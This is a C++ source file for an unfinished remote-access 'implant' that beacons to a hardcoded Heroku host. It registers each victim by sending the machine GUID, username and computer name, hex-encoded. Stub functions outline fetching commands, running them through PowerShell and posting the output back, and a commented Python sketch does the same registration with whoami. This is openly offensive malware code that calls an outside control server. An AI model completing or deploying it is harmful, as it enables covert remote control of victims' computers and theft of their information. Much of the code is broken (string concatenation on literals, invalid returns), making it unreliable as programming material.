#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <winreg.h>
#include <WinBase.h>
#include <lmcons.h>
#include <securitybaseapi.h>
#include <winerror.h>
#include <iphlpapi.h>
#include <iptypes.h>
#include <processthreadsapi.h>


#include <ws2tcpip.h>

#include <fileapi.h> 

//For hex converter
#include <stdexcept>
#include <sstream>
#include <iomanip>
#include <string>
#include <cstdint>
//For hex converter

//For http request
#include <windows.h>
#include <string>
#include <iostream>
#include <winhttp.h>
//For http request

#include <info.h> 
#include <http.h>

std::wstring server = L"ch0nkybear.herokuapp.com"; 
std::wstring register_path = L"/register";
std::wstring checkin_path = wcscat( L"/checkin/", GetMachineGuid()); //concat with implant_id
int port = 443;
bool useTLS = 1;

//Make request


std::wstring makeHttpRequest(std::wstring fqdn, int port, std::wstring uri, bool useTLS, std::wstring payload, DWORD payloadLength){
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    const wchar_t *payloadBuffer= new wchar_t [payloadLength];
    payloadBuffer = payload.c_str();
    LPCWSTR additionalHeaders = L"Content-Type: application/x-www-form-urlencoded\r\n";
    DWORD headersLength = -1L;

    std::wstring result = std::wstring();
    wchar_t* buffer;
    hSession = ::WinHttpOpen(L"WinHTTP Demo/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME , WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession)
        hConnect = ::WinHttpConnect(hSession, fqdn.c_str(), port, 0);
    if (hConnect)
        if(useTLS)
            hRequest = ::WinHttpOpenRequest(hConnect, L"POST", uri.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        else
            hRequest = ::WinHttpOpenRequest(hConnect, L"POST", uri.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (hRequest)
        bResults = ::WinHttpSendRequest( hRequest, additionalHeaders, headersLength, &payloadBuffer, payloadLength, payloadLength, 0);
    if(bResults){
        bResults = WinHttpReceiveResponse( hRequest, NULL);
    }
    if (bResults){
        do{
            dwSize = 0;
            if (!WinHttpQueryDataAvailable( hRequest, &dwSize)){}
            pszOutBuffer = new char[dwSize+1];
            if (!pszOutBuffer){
                printf("Out of memory\n");
                dwSize=0;
            }
            else{
                ZeroMemory(pszOutBuffer, dwSize+1);
                if (!WinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)){}
                else{
                    buffer = new wchar_t[dwSize+1];
                    mbstowcs (buffer, pszOutBuffer, dwSize+1);
                    //wprintf(buffer); //
                    result.append(buffer);
                    delete [] buffer;
                }
                delete [] pszOutBuffer;
            }
        }while (dwSize > 0);
    }
    if (!bResults)
        printf("Error %d has occurred.\n", GetLastError());
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    //printf("Success!");
    //std::wcout << result << std::endl;
    return result;
}





//Convert from string to hex
//https://stackoverflow.com/questions/3381614/c-convert-string-to-hexadecimal-and-vice-versa
std::wstring string_to_hex(const std::wstring &in) {
    std::wstringstream ss;

    ss << std::hex << std::setfill('0');
    for (size_t i = 0; in.length() > i; ++i) {
        ss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(in[i]));
    }

    return ss.str(); 
}



//get cmd
wchar_t *getCMD(){

    /*
    wchar_t* CMD;
	    wchar_t* result = makeHttpCMDRequest(server, 443, checkin_path, 1, NULL); //NULL == optional data to send to post request
	    if(result != NULL){
		    CMD = result.parse(); //MAKE PARSE FUNCTION
	    }
	return CMD; 
    }*/


    return;
}

//Run cmd
wchar_t *runCMD(wchar_t*CMD){

/*
    wchar_t*output;
	if(CMD ==NULL){
		return output;
	}
	BOOL h = CreateProcessW();
	if(!h){
		return output;
	}
	myPipe = CreateNamedPipeW(h);
	result = pOpen(myPipe, powershell, CMD, output = read(myPipe));
	output = result.read();
	return output;
}*/

    return;
}




//sendResponse(data from runtasks)
void sendData(wchar_t*output){

    /* 
    if(Data !=NULL){
		Data = hex(output);
		POST(server, 443, checkin_path, 1, Data);
	} */

    return;
}

/*EXAMPLE OF PYTHON REGISTER Function

implant_id = os.urandom(10).hex()
    whoami = subprocess.Popen("whoami", stdout=subprocess.PIPE)
    output += result.stdout.read().decode()
    r = requests.post(f"{server}{reigster_path}", json={"implant_id":implant_id, "whoami":whoami})
    if r.status_code ==200:
        if r.text == "OK":
            print("reigstered!")
            return True 
        
    return False 
	*/


//register function
bool registerImplant(){
	//Victim/implant info
	wchar_t *implant_id = wcscat(L"guid=", GetMachineGuid());
	wchar_t *implant_username = wcscat(L"&username=", myGetUserName());
	wchar_t *implant_computername = wcscat(L"&computername=", myGetComputerName());


	wchar_t *payload1 = wcscat(implant_id, implant_username);
	wchar_t *payload2 = wcscat(payload1, implant_computername);

	std::wstring hexpayload = string_to_hex(payload2);
    DWORD payload_length = hexpayload.length(); 
	//post to concat server + registerpath, put into json ?? 
    std::wstring r = makeHttpRequest(server, port, register_path, useTLS, hexpayload, payload_length);
    if (r == L"201"){ //WRONG
        //Success
        return true;
    }

	return false;
}


